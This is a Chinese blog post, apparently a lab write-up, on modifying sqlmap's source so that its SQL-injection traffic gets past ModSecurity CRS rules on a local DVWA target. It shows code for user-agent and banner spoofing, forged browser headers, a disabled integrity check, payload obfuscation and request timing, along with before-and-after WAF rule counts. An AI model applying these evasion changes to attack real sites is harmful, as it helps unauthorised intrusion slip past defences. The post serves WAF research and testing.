---
title: sqlmap 魔改研究 - 从流量特征到 WAF 对抗
cover: https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180841876.png
categories:
  - 工具魔改
tags:
  - 工具魔改
  - 免杀
  - SQL注入
  - WAF绕过
abbrlink: 5ddd3711
date: 2026-03-21 12:00:00# 🔧 sqlmap 魔改研究 —— 从流量特征到 WAF 对抗

> 本文记录了对 sqlmap 进行源码级魔改的完整过程，目标是通过修改流量特征、请求头、payload 混淆等手段，降低被 OWASP ModSecurity CRS 规则集检测到的概率。所有测试均在本地靶场（DVWA）环境下进行，仅用于学习和安全研究。
>
> https://www.cnblogs.com/wrold/p/19730842

---

## 🧠 思路

很多人用 sqlmap 跑 SQL 注入，结果一跑就被 WAF 拦得死死的，403 一片。

其实 WAF 拦截 sqlmap 不是魔法，靠的是**规则匹配**——它认识 sqlmap 的"味道"：固定的 UA、特定的请求头、可预测的 payload 结构。

所以思路也很简单：**把 sqlmap 改得不像 sqlmap**。

改哪里？大概分三层：

```
第一层：身份特征   → UA、版本字符串、Banner
第二层：流量特征   → 请求头、请求间隔、Host
第三层：Payload    → 关键字大小写、空格混淆、随机 padding
```

下面一层一层来。

---

## 🏗️ 环境搭建

- 靶场：DVWA（phpstudy 本地部署，端口 8564）
- WAF：OWASP ModSecurity CRS（Docker 部署，端口 8080）
- 工具：sqlmap 1.10，Python，Wireshark/小蓝鲨

**WAF 启动命令（检测模式，只记录不拦截）：**

```bash
docker run -d \
  --name modsec-waf \
  -p 8080:8080 \
  -e BACKEND=http://172.30.240.1:8564 \
  -e PROXY_SSL=off \
  -e PROXY_TIMEOUT=60 \
  -e MODSEC_RULE_ENGINE=DetectionOnly \
  owasp/modsecurity-crs:nginx
```

流量走向：

```
sqlmap → localhost:8080 → ModSecurity → phpstudy:8564 → DVWA
```

**保存日志：**

```bash
docker logs modsec-waf > waf_log.txt 2>&1
```

---

## 🔍 先看原版的"指纹"

用小蓝鲨抓一下原版 sqlmap 的包，过滤条件：

```
http.request && ip.dst == 127.0.0.1
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180204114.png)

一眼就能看到问题：

- `User-Agent: sqlmap/1.9.10#pip (https://sqlmap.org)` —— 这不就是自报家门吗 🤦
- `Accept: */*` —— 正常浏览器不会这么发
- 没有 `Accept-Language`、`Accept-Encoding`、`Referer` 等正常请求头

WAF 看到这个请求，直接触发 `913100`（扫描器 UA 检测）规则，得分 +5，超过阈值直接拦截。

---

## 📊 原版 WAF 检测基准数据

先跑一遍原版 sqlmap，记录 WAF 触发了哪些规则，作为对比基准：

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="..." --batch --level=3
```

**结果：**

| 规则ID | 触发次数 | 描述 |
|--------|---------|------|
| 913100 | 100次 | UA 含 sqlmap 字样 |
| 920350 | 100次 | Host 头是纯数字 IP |
| 942100 | 92次 | libinjection SQL注入检测 |
| 949110 | 100次 | 入站总分超阈值 |
| 942190 | 28次 | UNION SELECT 特征 |
| 942360 | 20次 | SQL 注入混淆特征 |
| 951230 | 18次 | MySQL 错误信息泄露 |

**汇总：**
- 规则触发总数：**516次**
- 平均每请求触发：**5.2 条规则**
- 平均异常分：**15.2 分**（WAF 阈值只有 5 分）

---

## 🛠️ 开始魔改

### 第一步：消除身份特征（`lib/core/settings.py`）

这是最核心的改动，把所有 sqlmap 字样从流量里抹掉。

**第 26 行，改版本字符串：**

```python
# 原来
VERSION_STRING = "sqlmap/%s#%s" % (...)
# 改成
VERSION_STRING = "requests/%s" % VERSION
```

**第 29 行，改默认 UA：**

```python
# 原来
DEFAULT_USER_AGENT = "%s (%s)" % (VERSION_STRING, SITE)
# 改成
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

**第 28 行，改站点：**

```python
SITE = "https://example.com"
```

**改 Banner（启动时显示的那个大字）：**

```python
BANNER = """\033[01;33m [*] Scanner Ready {%s} \033[0m""" % VERSION_STRING.split('/')[-1]
```

**改法律声明（去掉 sqlmap 字样）：**

```python
# 第 590 行
LEGAL_DISCLAIMER = "Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"
```

**改 `lib/utils/tui.py` 第 92 行：**

```python
header = " scanner - ncurses TUI "
```

**改 `controller.py` 第 175 行：**

```python
header = "scanner identified the following injection point(s) with "
```

**绕过 hash 校验（`lib/core/common.py`）：**

```python
def checkSums():
    return True  # 直接返回 True，跳过完整性校验
```

改完之后启动效果：

可以正常运行

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/sqlmap_image1.png)

Banner 已经变了，不再有 sqlmap 字样 ✅

---

### 第二步：补全请求头（`lib/request/basic.py`）

在 `forgeHeaders()` 函数里加入正常浏览器的请求头，让流量看起来更像真实用户：

```python
# ===== 魔改 Header 开始 =====
if "Accept" not in headers:
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
if "Accept-Language" not in headers:
    headers["Accept-Language"] = "en-US,en;q=0.9"
if "Accept-Encoding" not in headers:
    headers["Accept-Encoding"] = "gzip, deflate, br"
if "Connection" not in headers:
    headers["Connection"] = "keep-alive"
if "Upgrade-Insecure-Requests" not in headers:
    headers["Upgrade-Insecure-Requests"] = "1"
if "Referer" not in headers and conf.url:
    headers["Referer"] = conf.url
# ===== 魔改 Header 结束 =====
```

用小蓝鲨抓包对比，魔改后的请求头：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180540816.png)

UA 已经变成 Chrome，各种请求头都补齐了，跟正常浏览器访问几乎一样 ✅

---

### 第三步：Payload 混淆（`lib/core/agent.py`）

这是最有意思的部分，三个函数组合出击。

**① 关键字随机大小写 `random_case_keywords`：**

```python
def random_case_keywords(self, payload):
    keywords = [
        "SELECT", "UNION", "AND", "OR", "WHERE", "FROM",
        "ORDER", "BY", "GROUP", "HAVING", "LIMIT",
        "LIKE", "IN", "IS", "NULL", "JOIN", "LEFT", "RIGHT"
    ]
    for k in keywords:
        payload = re.sub(
            r"\b%s\b" % k,
            lambda m: "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in m.group(0)
            ),
            payload,
            flags=re.I
        )
    return payload
```

效果：`union select` → `UnIoN SeLeCt`

**② 空格随机替换 `obfuscate_space`：**

```python
def obfuscate_space(self, payload):
    spaces = [
        " ",        # 普通空格
        "/**/",     # 注释（注意：/*!*/ 会触发 942500，已注释掉）
        # "/*!*/",
        "%09",      # tab
        "%0A",      # newline
        "%0D",      # carriage return
        "%0C",      # form feed
        "%0B"       # vertical tab
    ]
    # ...对关键字后的空格进行随机替换
```

> ⚠️ **踩坑记录：** 最开始列表里有 `/*!*/`（MySQL 内联注释），测试后发现它会触发 WAF 规则 `942500`，反而帮了倒忙，所以注释掉了。

**③ 随机 padding `random_padding`：**

```python
def random_padding(self, payload):
    from lib.core.common import randomStr
    # 已经有注释就不加
    if "--" in payload or "#" in payload or "/*" in payload:
        return payload
    # 只随机一部分请求
    if random.random() < 0.5:
        payload += "-- " + randomStr(3)
    return payload
```

**在 `payload()` 方法末尾组合调用：**

```python
if retVal:
    retVal = retVal.replace(BOUNDARY_BACKSLASH_MARKER, '\\')
    # ===== payload 混淆 =====
    retVal = self.random_case_keywords(retVal)
    if random.random() < 0.5:#因为可能会让部分场景的payload失效，所以加入随机触发
        retVal = self.obfuscate_space(retVal)
    retVal = self.random_padding(retVal)
```

混淆后的 payload 效果：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180841876.png)

随机大小写 + 空格替换+末尾注释都生效了 ✅

---

### 第四步：请求延迟（`lib/request/connect.py`）

在 `queryPage()` 函数里加入随机延迟，模拟真实用户的请求间隔：

```python
if random.random() < 0.6:
    time.sleep(random.uniform(0.03, 0.08))
```

> 💡 加了这个之后跑时间盲注可能会触发 `CRITICAL: considerable lagging` 警告，可以加 `--time-sec=10` 参数。

---

### 第五步：打乱 UNION 检测顺序（`lib/techniques/union/test.py`）

原版按顺序逐列测试，行为特征明显：

```python
# 原来
for count in xrange(lowerCount, upperCount + 1):

# 改成
counts = list(range(lowerCount, upperCount + 1))
random.shuffle(counts)
for count in counts:
```

---

### 第六步：改随机字符集（`lib/core/common.py`）

sqlmap 生成的随机标记默认含大写字母，看起来很可疑，改成全小写+数字：

```python
# 改这里
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
retVal = "".join(choice(charset) for _ in xrange(0, length))
```

---

### 第七步：消除 Host 是 IP 的特征

WAF 规则 `920350` 专门检测 `Host` 头是纯数字 IP 的请求，认为正常用户都用域名访问。

不需要改源码，跑的时候加一个参数就行：

```bash
python sqlmap.py -u "http://127.0.0.1:8080/..." --host="dvwa.local" ...
```

---

## 📈 最终测试结果

改完之后，重建干净的 WAF 容器重新测试：

```bash
python sqlmap.py \
  -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --host="dvwa.local" \
  --cookie="..." \
  --batch --level=3 --flush-session --time-sec=10
```

**对比数据：**

| 指标 | 原版 | 魔改版 | 变化 |
|------|------|--------|------|
| 规则触发总数 | 516 | 330 | **-186 (-36%)** |
| 平均每请求触发规则 | 5.2 条 | 3.3 条 | **-1.9 条** |
| 平均异常分 | 15.2 | 8.8 | **-6.4 分** |
| 最高异常分 | 83 | 75 | **-8 分** |

**各规则变化：**

| 规则ID | 描述 | 原版 | 魔改版 | 结果 |
|--------|------|------|--------|------|
| 913100 | UA 扫描器特征 | 100 | 0 | ✅ 完全消除 |
| 920350 | Host 是纯 IP | 100 | 1 | ✅ 基本消除 |
| 942500 | MySQL 注释混淆 | 0 | 0 | ✅ 未引入 |
| 942100 | libinjection SQLi | 92 | 98 | ❌ 略微增加 |
| 942190 | UNION SELECT | 28 | 30 | ➖ 基本持平 |
| 942360 | SQL 混淆特征 | 20 | 20 | ➖ 持平 |

---

## 🧱 遇到的瓶颈

`942100`（libinjection）是这次魔改绕不过去的坎，改了反而从 92 涨到了 98。

**为什么？**

libinjection 不是靠关键字匹配，而是**语义层分析**。它把 SQL 语句解析成 token 序列，分析语法结构，判断是否是注入。

```
原始:  1' AND 6358=6358-- WjXy
libinjection 解析: s&1c  ← 这是它的"指纹码"，表示字符串+逻辑运算
```

不管你把 `AND` 改成 `AnD` 还是 `A/**/N/**/D`，语法结构没变，libinjection 照样识别。

**这说明什么？**

字符层面的混淆（大小写、注释替换、空格变换）对抗不了语义层的检测。真正绕过 libinjection 需要找**语法歧义**——让注入语句在语义层面"看起来不像 SQL 注入"，这是更深一层的研究方向。

---

## 🎯 总结

这次魔改的核心思路：**把 sqlmap 的已知特征一层一层抹掉**。

**成功消除的特征：**

- 🔇 UA 里的 sqlmap 字样（`913100` 清零）
- 🔇 Host 头是裸 IP（`920350` 清零）
- 🔇 没有正常浏览器应有的请求头
- 🔇 固定的 Banner 和版本字符串

**改造效果：**
- 规则触发总数从 516 降到 330，下降 **36%**
- 平均异常分从 15.2 降到 8.8，下降 **42%**
- sqlmap 检测功能**完全正常**，四种注入类型均可检测

**没绕过的：**

- `942100` libinjection 语义检测 —— 字符混淆对它无效，这是本次的边界

**下一步研究方向：**

```
字符层混淆（本次）
    ↓
语法层混淆（寻找 SQL 方言差异）
    ↓
语义层绕过（找 libinjection 的解析漏洞）
```

---

> 📌 本文所有操作均在本地搭建的 DVWA 靶场环境中进行，仅用于学习 WAF 检测原理和安全研究。请勿将相关技术用于未经授权的目标。
